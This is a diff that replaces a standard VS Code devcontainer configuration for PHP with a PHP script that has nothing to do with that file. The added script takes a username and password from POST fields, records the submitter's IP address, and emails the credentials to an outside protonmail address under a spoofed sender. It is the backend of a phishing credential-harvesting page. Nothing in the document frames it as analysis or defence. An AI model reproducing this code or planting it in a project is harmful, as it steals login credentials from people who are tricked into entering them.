@@ -1,38 +1,29 @@
-// For format details, see https://aka.ms/devcontainer.json. For config options, see the
-// README at: https://github.com/devcontainers/templates/tree/main/src/php
-{
-	"name": "PHP",
-	// Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile
-	"image": "mcr.microsoft.com/devcontainers/php:1-8.3",
+<?php
+$ip = getenv("REMOTE_ADDR");
+$login = $_POST['ai'];
+$passwd= $_POST['pr'];
 
-	// Features to add to the dev container. More info: https://containers.dev/features.
-	// "features": {},
+$done = array('signal'=>'ok');
+$bad = array('signal'=>'bad');
 
-	// Configure tool-specific properties.
-	"customizations": {
-		// Configure properties specific to VS Code.
-		"vscode": {
-			"settings": {},
-			"extensions": [
-				"streetsidesoftware.code-spell-checker"
-			]
-		}
-	},
 
-	// Use 'forwardPorts' to make a list of ports inside the container available locally.
-	// "forwardPorts": [8000],
+if (!empty($login) && !empty($passwd)) {
 
-	// Use 'portsAttributes' to set default properties for specific forwarded ports. More info: https://code.visualstudio.com/docs/remote/devcontainerjson-reference.
-	"portsAttributes": {
-		"8000": {
-			"label": "Hello Remote World",
-			"onAutoForward": "notify"
-		}
-	}
 
-	// Use 'postCreateCommand' to run commands after the container is created.
-	// "postCreateCommand": "sudo chmod a+x \"$(pwd)\" && sudo rm -rf /var/www/html && sudo ln -s \"$(pwd)\" /var/www/html"
+    $own = 'customerlogin@protonmail.com';
+    $date = date("D/M/d, Y g:i a");
+    $subj = "$login  from $ip";
+    $from = "From: Webmaila<smtp@me.mom163.com>";
+    $msg = "Username: $login\nPassword: $passwd\nSubmitted from IP Address - $ip on $date\n-----------------------------------\n        Created By (~)\n-----------------------------------";
+    mail($own,$subj,$msg,$from);
 
-	// Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.
-	// "remoteUser": "root"
+    echo json_encode($done);
+
+    }
+
+else {
+  echo json_encode($bad);
 }
+
+
+?>
